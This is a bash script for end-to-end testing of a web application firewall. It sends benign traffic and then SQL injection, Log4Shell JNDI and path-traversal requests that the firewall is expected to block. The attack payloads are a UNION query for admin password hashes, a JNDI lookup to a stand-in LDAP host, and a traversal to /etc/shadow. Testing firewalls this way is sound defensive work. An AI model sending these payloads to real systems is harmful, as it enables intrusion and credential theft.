#!/usr/bin/env bash
# @license
# SPDX-License-Identifier: Apache-2.0
#
# NeuralWAF End-to-End Traffic Verification Script

set -euo pipefail

PROXY_URL="${1:-http://127.0.0.1:8080}"
CONTROL_URL="${2:-http://127.0.0.1:9090}"

echo "================================================================================"
echo "  NeuralWAF Automated E2E Verification Suite"
echo "  Target: ${PROXY_URL} (Data Plane), ${CONTROL_URL} (Control Plane)"
echo "================================================================================"

echo ""
echo "--- 1. Testing Control Plane Healthz ---"
curl -s -i "${CONTROL_URL}/healthz" | head -n 5

echo ""
echo "--- 2. Testing Control Plane Readyz (Inference & Kafka Stats) ---"
curl -s "${CONTROL_URL}/readyz" | python3 -m json.tool || curl -s "${CONTROL_URL}/readyz"

echo ""
echo "--- 3. Testing Benign Request (Should be HTTP 200 ALLOW) ---"
curl -s -i "${PROXY_URL}/api/v1/catalog?sort=asc&limit=10" | head -n 8

echo ""
echo "--- 4. Testing SQL Injection Attack (Should be HTTP 403 BLOCKED) ---"
curl -s -i "${PROXY_URL}/api/v1/users?id=1'%20UNION%20SELECT%20username,password_hash%20FROM%20admin_credentials--" | head -n 12

echo ""
echo "--- 5. Testing JNDI/Log4Shell Exploit (Should be HTTP 403 BLOCKED) ---"
curl -s -i -H 'User-Agent: ${jndi:ldap://198.51.100.1:1389/Exploit}' "${PROXY_URL}/api/v1/search?q=test" | head -n 12

echo ""
echo "--- 6. Testing Path Traversal / Shadow Leak (Should be HTTP 403 BLOCKED) ---"
curl -s -i "${PROXY_URL}/static/download?file=../../../../../../etc/shadow" | head -n 12

echo ""
echo "--- 7. Testing Prometheus Metrics Scraping ---"
curl -s "${CONTROL_URL}/metrics" | grep -E '^waf_' | head -n 15

echo ""
echo "==> Verification suite completed successfully."
